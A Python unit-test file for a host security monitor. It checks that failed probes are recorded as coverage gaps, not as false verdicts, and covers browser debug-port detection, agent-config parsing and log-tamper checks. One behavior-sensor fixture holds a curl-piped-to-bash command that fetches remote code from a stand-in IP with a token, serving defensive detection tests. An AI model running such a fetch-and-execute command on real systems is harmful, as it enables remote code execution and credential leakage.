#!/usr/bin/env python3
"""A probe that could not answer must not be rendered as a verdict.

Three findings from one adversarial audit (2026-09-04), all the same shape:

  * `_browser_loopback_entries` concluded "this browser holds a loopback
    listener and has NO --remote-debugging flag" from a command line it had not
    read. `_iter_processes` falls back to the EXEC PATH when its argv `ps` call
    fails, and an exec path never contains the flag -- so a failed argv probe
    did not weaken the claim, it manufactured it, against every browser on the
    machine at once. `_PROC_ARGV_PARTIAL` already recorded that exact condition
    and the process sensor already reported itself DEGRADED for it; the two
    never spoke. FALSE POSITIVE against the operator's own browsers.

  * `snapshot_agent_surface` recorded an unparseable JSON config with
    `entries = []` -- byte-identical to a config that declares no exec entries
    at all -- and dropped oversize/unreadable ones with a bare `continue`.
    FAIL-OPEN on the surface that registers what agents may execute.

An AST sweep found the second shape at 31 sites across the sensors (a bare
`continue` on a stat that failed, a `names = []` on a listdir that was denied,
a `cur_size = 0` on a size that could not be read -- which alerted HIGH
"findings log truncated" on exactly a read error). Patching three sites is a
bandage; the mechanism is:

  * unexamined(subject, why, exc): the one channel for "I found this and could
    not examine it". Never raises. Records against the sensor _collect_sensor /
    _scan_surfaces is running, so a site does not need to know its own id.
  * the health row stays OK with the gap in its detail, because three non-OK
    rows open a HIGH "coverage degraded" incident and that alarm is for a
    sensor that stopped answering, not one unreadable file in ~/Downloads.
  * check_coverage emits one finding per sensor with gaps, fingerprinted on the
    set of subjects: a stable gap is one incident the operator can accept, a
    new one re-alerts. ENOENT/ESRCH gaps are ABSENT -- counted, never alarmed.
  * tests/test_sensor_invariants.py sweeps the source so the next silent site
    fails the suite by name.

The fourth finding is the operator's: #347 was a HIGH behavior finding that
could not be attributed, because the record held a sha256 and nothing else.
The retention rule permits the evidence that earned a verdict, redacted; the
behavior finding now carries it.
"""
import errno
import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import aegis  # noqa: E402
from test_regression import Sandbox  # noqa: E402

BROWSER = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"


class CdpArgvIsNotAVerdict(unittest.TestCase):
    def tearDown(self):
        aegis._PROC_ARGV_PARTIAL = False

    def test_a_reliable_argv_with_no_flag_still_alarms(self):
        # The sensor must keep working; this is the case it exists for.
        out = aegis._browser_loopback_entries(
            [(BROWSER, "9222", BROWSER + " --type=renderer")],
            argv_partial=False)
        self.assertEqual(list(out), ["loopback:%s:9222" % BROWSER])

    def test_a_flagged_browser_is_still_skipped(self):
        out = aegis._browser_loopback_entries(
            [(BROWSER, "9222", BROWSER + " --remote-debugging-port=9222")],
            argv_partial=False)
        self.assertEqual(out, {})

    def test_an_unreliable_argv_yields_no_accusation(self):
        out = aegis._browser_loopback_entries(
            [(BROWSER, "9222", BROWSER)], argv_partial=True)
        self.assertEqual(
            out, {},
            "an argv the process table could not read is not an argv without "
            "the flag")

    def test_the_exec_path_fallback_is_what_made_this_reachable(self):
        # _iter_processes yields `argvs.get(pid) or comm` -- so when the argv
        # call fails, argv IS the exec path. That string never contains
        # --remote-debugging, so every browser took the alarm branch.
        row = [(BROWSER, "9222", BROWSER)]
        self.assertEqual(
            len(aegis._browser_loopback_entries(row, argv_partial=False)), 1,
            "sanity: the fallback string does look like 'no flag'")
        self.assertEqual(
            aegis._browser_loopback_entries(row, argv_partial=True), {},
            "and consulting the flag is what stops it becoming an accusation")

    def test_it_defaults_to_the_flag_the_process_sensor_already_sets(self):
        aegis._PROC_ARGV_PARTIAL = True
        self.assertEqual(
            aegis._browser_loopback_entries([(BROWSER, "9222", BROWSER)]), {},
            "the default must consult the module flag, or the fix only works "
            "for callers that remember to pass it")


class LedgerFixture(unittest.TestCase):
    def setUp(self):
        aegis._reset_unexamined()
        self._trunc = aegis._AGENT_SCAN_TRUNCATED[0]
        aegis._AGENT_SCAN_TRUNCATED[0] = False

    def tearDown(self):
        aegis._reset_unexamined()
        aegis._AGENT_SCAN_TRUNCATED[0] = self._trunc
        aegis._CURRENT_SENSOR[0] = None


class TheLedger(LedgerFixture):
    def test_records_against_the_running_sensor(self):
        def sensor():
            aegis.unexamined("/x/a", "could not be read")
            return []
        aegis._run_as_sensor("hot-dir", sensor)
        self.assertEqual([("/x/a", "could not be read")], aegis._gaps("hot-dir"))
        self.assertIsNone(aegis._CURRENT_SENSOR[0], "the id must be restored")

    def test_outside_a_scan_it_records_but_never_alerts(self):
        aegis.unexamined("/x/a", "could not be read")
        self.assertEqual([("/x/a", "could not be read")], aegis._gaps("(direct)"))
        self.assertEqual([], aegis.check_coverage(),
                         "a by-hand call or a test must not fabricate a "
                         "coverage incident")

    def test_absence_is_counted_never_alarmed(self):
        def sensor():
            aegis.unexamined("/x/gone", "could not be stat'd",
                             FileNotFoundError(errno.ENOENT, "gone"))
            aegis.unexamined("pid 9", "could not be stat'd",
                             ProcessLookupError(errno.ESRCH, "exited"))
            return []
        aegis._run_as_sensor("hot-dir", sensor)
        self.assertEqual([], aegis._gaps("hot-dir"))
        self.assertIn("gone before", aegis._coverage_note("hot-dir"))
        self.assertEqual([], aegis.check_coverage())

    def test_a_denied_read_inside_home_is_a_real_gap(self):
        def sensor():
            aegis.unexamined(os.path.join(aegis.HOME, "x", "a"),
                             "could not be read",
                             PermissionError(errno.EACCES, "denied"))
            return []
        aegis._run_as_sensor("hot-dir", sensor)
        self.assertEqual(1, len(aegis._gaps("hot-dir")))
        self.assertIn("NOT examined", aegis._coverage_note("hot-dir"))

    def test_a_privilege_wall_is_counted_never_alarmed(self):
        # The BTM store on the first live install: root-only, reported as a
        # MEDIUM coverage finding every scan. The agent is forbidden the
        # privilege that would lift it, so it is the boundary, not a fault.
        def sensor():
            aegis.unexamined("/private/var/db/com.apple.backgroundtaskmanagement",
                             "could not be listed",
                             PermissionError(errno.EACCES, "denied"))
            aegis.unexamined(os.path.join(aegis.HOME, "Library", "Mail"),
                             "could not be listed",
                             PermissionError(errno.EPERM, "tcc"))
            return []
        aegis._run_as_sensor("surface.btm_store", sensor)
        self.assertEqual([], aegis._gaps("surface.btm_store"))
        self.assertIn("2 item(s) behind a privilege wall",
                      aegis._coverage_note("surface.btm_store"))
        self.assertEqual([], aegis.check_coverage())

    def test_never_raises(self):
        class Bad(object):
            def __str__(self):
                raise RuntimeError("no")
        aegis.unexamined(Bad(), "why")           # must not propagate
        aegis.unexamined("x", Bad())
        aegis.unexamined("x", "y", object())

    def test_the_cap_counts_the_overflow(self):
        def sensor():
            for i in range(aegis._UNEXAMINED_CAP + 7):
                aegis.unexamined("/x/%d" % i, "could not be read")
            return []
        aegis._run_as_sensor("hot-dir", sensor)
        self.assertEqual(aegis._UNEXAMINED_CAP, len(aegis._gaps("hot-dir")))
        self.assertIn("7 more past the ledger cap",
                      aegis._coverage_note("hot-dir"))

    def test_reset_clears_everything(self):
        aegis._run_as_sensor("hot-dir",
                             lambda: aegis.unexamined("/x/a", "w"))
        aegis._reset_unexamined()
        self.assertEqual({}, aegis._UNEXAMINED)
        self.assertEqual("", aegis._coverage_note("hot-dir"))


class TheHealthRowStaysOK(LedgerFixture):
    """The load-bearing design call: _record_health opens a HIGH incident on
    three consecutive non-OK rows. A per-item gap must be visible on the row
    and must NOT feed that counter."""

    def test_collect_sensor_notes_the_gap_on_an_ok_row(self):
        health = []
        def sensor():
            aegis.unexamined("/x/a", "could not be read")
            return []
        aegis._collect_sensor("hot-dir", sensor, health)
        self.assertEqual("OK", health[0]["status"])
        self.assertIn("NOT examined", health[0]["detail"])

    def test_a_whole_sensor_non_answer_is_still_degraded(self):
        health = []
        aegis._collect_sensor("hot-dir", lambda: None, health)
        self.assertEqual("DEGRADED", health[0]["status"])

    def test_a_clean_sensor_has_an_empty_detail(self):
        health = []
        aegis._collect_sensor("hot-dir", lambda: [], health)
        self.assertEqual("", health[0]["detail"])

    def test_prep_steps_carry_the_note_too(self):
        health = []
        def prep():
            aegis.unexamined("/proc", "could not be listed")
            return {}
        aegis._collect_prep("prep.socket-inode", prep, health)
        self.assertEqual("OK", health[0]["status"])
        self.assertIn("NOT examined", health[0]["detail"])


class TheCoverageFinding(LedgerFixture):
    def _gap(self, sid, *subjects):
        def sensor():
            for s in subjects:
                aegis.unexamined(s, "could not be read")
        aegis._run_as_sensor(sid, sensor)

    def test_one_finding_per_sensor_with_gaps(self):
        self._gap("hot-dir", "/x/a", "/x/b")
        self._gap("staging", "/y/c")
        self._gap("clipboard")
        out = aegis.check_coverage()
        self.assertEqual(["hot-dir", "staging"],
                         sorted(f["sensor"] for f in out))
        hot = [f for f in out if f["sensor"] == "hot-dir"][0]
        self.assertEqual("LOW", hot["severity"])
        self.assertEqual("coverage", hot["category"])
        self.assertIn("2 item(s)", hot["detail"])
        self.assertIn("UNKNOWN, not clean", hot["detail"])
        # MEDIUM/LOW never become incidents (the floor is HIGH); the first
        # live report told the operator to "accept this incident" -- one that
        # could not exist. The text must describe where the finding actually
        # goes.
        self.assertIn("digest-routed", hot["detail"])
        self.assertNotIn("accept this incident", hot["detail"])
        self.assertEqual(["/x/a", "/x/b"], hot["unexamined"])

    def test_an_exec_registering_surface_is_medium(self):
        self._gap("surface.agent_surface", "/x/mcp.json")
        out = aegis.check_coverage()
        self.assertEqual("MEDIUM", out[0]["severity"])
        self.assertIn("registers what RUNS", out[0]["detail"])

    def _kind(self, sid, why, *subjects):
        def sensor():
            for s in subjects:
                aegis.unexamined(s, why)
        aegis._run_as_sensor(sid, sensor)

    def test_identity_is_the_set_of_kinds_not_of_subjects(self):
        # The first live install: 121 agent-surface items, session transcripts
        # past the read cap and JSONL telemetry under .json names, churning
        # hourly. Keyed on subjects that was a MEDIUM re-alert every scan.
        self._kind("hot-dir", "larger than the read cap", "/x/b", "/x/a")
        one = aegis.check_coverage()[0]["fingerprint"]
        aegis._reset_unexamined()
        self._kind("hot-dir", "larger than the read cap", "/x/c", "/x/d", "/x/e")
        two = aegis.check_coverage()[0]["fingerprint"]
        self.assertEqual(one, two, "more files of a known kind are the same "
                         "fact; the detail carries the current count")
        aegis._reset_unexamined()
        self._kind("hot-dir", "larger than the read cap", "/x/a")
        self._kind("hot-dir", "could not be read: denied", "/x/z")
        three = aegis.check_coverage()[0]["fingerprint"]
        self.assertNotEqual(one, three, "a new KIND of gap is a new fact")
        f = aegis.check_coverage()[0]
        self.assertEqual(["could not be read", "larger than the read cap"],
                         f["kinds"])
        self.assertIn("Kind(s):", f["detail"])

    def test_the_detail_after_the_colon_does_not_split_a_kind(self):
        self._kind("hot-dir", "is not parseable JSON: Expecting value", "/a")
        one = aegis.check_coverage()[0]["fingerprint"]
        aegis._reset_unexamined()
        self._kind("hot-dir", "is not parseable JSON: Extra data", "/b")
        self.assertEqual(one, aegis.check_coverage()[0]["fingerprint"])

    def test_truncation_and_ledger_gaps_both_survive(self):
        self._gap("surface.agent_surface", "/x/mcp.json")
        aegis._AGENT_SCAN_TRUNCATED[0] = True
        aegis._AGENT_SCAN_TRUNCATED_ROOTS[:] = ["/some/root"]
        try:
            titles = [f["title"] for f in aegis.check_coverage()]
        finally:
            del aegis._AGENT_SCAN_TRUNCATED_ROOTS[:]
        self.assertEqual(2, len(titles), titles)

    def test_it_passes_custody(self):
        # finding() redacts detail and extras; the subjects reach the operator
        # through it, not around it.
        self._gap("hot-dir", "/x/token=not-a-real-secret")
        f = aegis.check_coverage()[0]
        self.assertNotIn("not-a-real-secret", json.dumps(f))


class AgentConfigNonAnswers(LedgerFixture):
    SID = "surface.agent_surface"

    def setUp(self):
        LedgerFixture.setUp(self)
        self.tmp = tempfile.mkdtemp(prefix="aegis-nonanswer-")
        self._files = aegis._agent_config_files

    def tearDown(self):
        aegis._agent_config_files = self._files
        LedgerFixture.tearDown(self)

    def _write(self, name, text):
        p = os.path.join(self.tmp, name)
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(text)
        aegis._agent_config_files = lambda: [p]
        return p

    def _snapshot(self):
        return aegis._run_as_sensor(self.SID, aegis.snapshot_agent_surface)

    def test_an_unparseable_config_is_not_recorded_as_exec_free(self):
        p = self._write("mcp.json", '{"mcpServers": {"x": {"command":')
        snap = self._snapshot()
        self.assertIn(p, snap, "the hash is still a fact worth diffing")
        self.assertEqual([p], [s for s, _w in aegis._gaps(self.SID)])
        titles = [f["title"] for f in aegis.check_coverage()]
        self.assertEqual(
            ["Sensor found items it could not examine: %s" % self.SID], titles)

    def test_a_parseable_config_reports_no_coverage_gap(self):
        self._write("ok.json", json.dumps({"mcpServers": {}}))
        self._snapshot()
        self.assertEqual([], aegis._gaps(self.SID))
        self.assertEqual([], aegis.check_coverage())

    def test_an_oversize_config_is_recorded_rather_than_dropped(self):
        self._write("big.json", "{" + " " * (aegis._AGENT_TEXT_CAP + 64))
        self._snapshot()
        gaps = aegis._gaps(self.SID)
        self.assertEqual(1, len(gaps))
        self.assertIn("read cap", gaps[0][1])

    def test_an_unreadable_config_is_recorded_rather_than_dropped(self):
        p = self._write("nope.json", "{}")
        os.chmod(p, 0)
        self.addCleanup(os.chmod, p, 0o600)
        if hasattr(os, "getuid") and os.getuid() == 0:
            self.skipTest("root can read a 0-mode file")
        if aegis.IS_WIN:
            self.skipTest("chmod 0 does not deny the owner on Windows")
        self._snapshot()
        self.assertEqual(1, len(aegis._gaps(self.SID)), aegis._UNEXAMINED)


class JsonWithComments(unittest.TestCase):
    """VS Code, Cursor and Zed write JSONC. Strict json.loads recorded VS
    Code's settings.json -- where `mcp.servers` lives -- as unparseable on the
    reference machine, so the surface had never read it."""

    def test_comments_and_trailing_commas_parse(self):
        text = ('{\n  // editor\n  "mcp": { "servers": { "x": {\n'
                '    "command": "npx", /* why */ "args": ["-y", "pkg",],\n'
                '  }, }, },\n  "s": "http://not.a/comment", }')
        obj = aegis._loads_jsonc(text)
        self.assertEqual("http://not.a/comment", obj["s"])
        self.assertEqual(
            [("mcp.servers.x", "npx", ["-y", "pkg"])],
            aegis._agent_exec_entries(obj))

    def test_a_string_holding_slashes_is_not_a_comment(self):
        self.assertEqual({"u": "a//b /* c */"},
                         aegis._loads_jsonc('{"u": "a//b /* c */"}'))

    def test_strict_json_takes_the_fast_path_unchanged(self):
        self.assertEqual({"a": [1]}, aegis._loads_jsonc('{"a": [1]}'))

    def test_a_truly_broken_file_still_raises(self):
        with self.assertRaises(ValueError):
            aegis._loads_jsonc('{"mcpServers": {"x": {"command":')
        with self.assertRaises(ValueError):
            aegis._loads_jsonc('{"a":1}\n{"a":2}\n')     # JSONL under .json


class RetiredSensorIds(Sandbox):
    """A renamed sensor left its old health row forever: doctor said
    'agent-surface-coverage DID NOT RUN' and went DEGRADED on the first scan
    after the rename."""

    def test_the_ghost_row_and_its_incident_are_retired(self):
        aegis.ensure_state()
        db = aegis._event_connection()
        try:
            now = int(aegis.time.time())
            db.execute("INSERT INTO sensor_status(sensor_id,status,last_run_at,"
                       "duration_ms,item_count,detail,consecutive_failures) "
                       "VALUES('agent-surface-coverage','OK',?,0,0,'',0)",
                       (now - 3600,))
            aegis._upsert_incident(db, "sensor:agent-surface-coverage",
                                   "Security coverage degraded: x", "HIGH",
                                   "sensor-health", now - 3600, [])
            db.commit()
            aegis._record_health(db, [{"sensor_id": "coverage", "status": "OK",
                                       "detail": "", "duration_ms": 0,
                                       "item_count": 0}], now)
            db.commit()
            ids = [r["sensor_id"] for r in db.execute(
                "SELECT sensor_id FROM sensor_status").fetchall()]
            self.assertNotIn("agent-surface-coverage", ids)
            self.assertIn("coverage", ids)
            row = db.execute("SELECT status, resolution FROM incidents WHERE "
                             "correlation_key='sensor:agent-surface-coverage'"
                             ).fetchone()
            self.assertEqual("RESOLVED", row["status"])
            self.assertIn("retired", row["resolution"])
        finally:
            db.close()


class TheSizeThatCouldNotBeRead(Sandbox):
    """`cur_size = 0` on ANY exception alerted HIGH 'findings log truncated'
    on a log that merely could not be stat'd. Gone is still truncation."""

    def setUp(self):
        Sandbox.setUp(self)
        aegis._reset_unexamined()

    def tearDown(self):
        aegis._reset_unexamined()
        Sandbox.tearDown(self)

    def test_a_deleted_log_still_reads_as_truncated(self):
        aegis.save_json(aegis.SELFSTATE, {"findings_size": 9999})
        if os.path.exists(aegis.FINDINGS_LOG):
            os.remove(aegis.FINDINGS_LOG)
        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
        self.assertTrue(any(fp.startswith("self:log:truncated") for fp in fps))

    def test_an_unreadable_log_is_a_gap_not_a_tamper_alert(self):
        if aegis.IS_WIN or (hasattr(os, "getuid") and os.getuid() == 0):
            self.skipTest("needs a directory the owner cannot search")
        locked = os.path.join(self.tmp, "locked")
        os.makedirs(locked)
        saved = aegis.FINDINGS_LOG
        aegis.FINDINGS_LOG = os.path.join(locked, "findings.jsonl")
        with open(aegis.FINDINGS_LOG, "w") as f:
            f.write("a" * 10)
        aegis.save_json(aegis.SELFSTATE, {"findings_size": 9999})
        os.chmod(locked, 0)
        try:
            fps = [x["fingerprint"] for x in
                   aegis._run_as_sensor("self-protection",
                                        aegis.check_self_protection)]
        finally:
            # Before Sandbox.tearDown removes the tree, not as a cleanup
            # (those run after it).
            os.chmod(locked, 0o700)
            aegis.FINDINGS_LOG = saved
        self.assertFalse(any("truncated" in fp for fp in fps),
                         "a size that could not be read is not a size of 0")
        # Recorded on the ledger. (The sandbox lives outside HOME, so this
        # particular denial classifies as a privilege wall rather than a gap;
        # the real FINDINGS_LOG is under ~/.aegis and would be a gap.)
        self.assertEqual(1, len(aegis._UNEXAMINED.get("self-protection", [])))


class AncestryThatCouldNotBeRead(LedgerFixture):
    def setUp(self):
        LedgerFixture.setUp(self)
        self._table = aegis._process_ancestry_table

    def tearDown(self):
        aegis._process_ancestry_table = self._table
        LedgerFixture.tearDown(self)

    def test_a_failed_table_is_recorded_not_swallowed(self):
        def boom():
            raise RuntimeError("ps died")
        aegis._process_ancestry_table = boom
        f = {"pid": "4242", "detail": "x"}
        aegis._run_as_sensor("behavior", aegis._annotate_ancestry, [f])
        self.assertNotIn("ancestry", f)
        self.assertEqual([("process ancestry",
                           "the process table could not be read for lineage: "
                           "ps died")], aegis._gaps("behavior"))


class TheOperatorCanJudgeABehaviorFinding(unittest.TestCase):
    OWN = "501"
    ROWS = [("4242", "501", "/bin/bash",
             "bash -c curl -fsSL http://198.51.100.7/a?token=SECRETVALUE123 "
             "| bash")]

    def setUp(self):
        self._saved = (aegis._iter_processes, aegis._own_owner,
                       aegis._process_ancestry_table)
        aegis._iter_processes = lambda: iter(self.ROWS)
        aegis._own_owner = lambda: self.OWN
        aegis._process_ancestry_table = lambda: {}

    def tearDown(self):
        (aegis._iter_processes, aegis._own_owner,
         aegis._process_ancestry_table) = self._saved

    def test_the_finding_carries_a_redacted_command(self):
        got = aegis.check_behavior()
        self.assertEqual(1, len(got))
        f = got[0]
        self.assertIn("command: bash -c curl", f["detail"])
        self.assertIn("| bash", f["command_preview"])
        self.assertNotIn("SECRETVALUE123", json.dumps(f),
                         "the evidence passes through redact_sensitive first")
        self.assertIn("[REDACTED]", f["command_preview"])
        # Identity stays on the hash of the RAW argv, so a redaction change
        # never re-alerts an accepted incident.
        self.assertTrue(f["fingerprint"].endswith(f["command_sha256"][:16]))


if __name__ == "__main__":
    unittest.main()
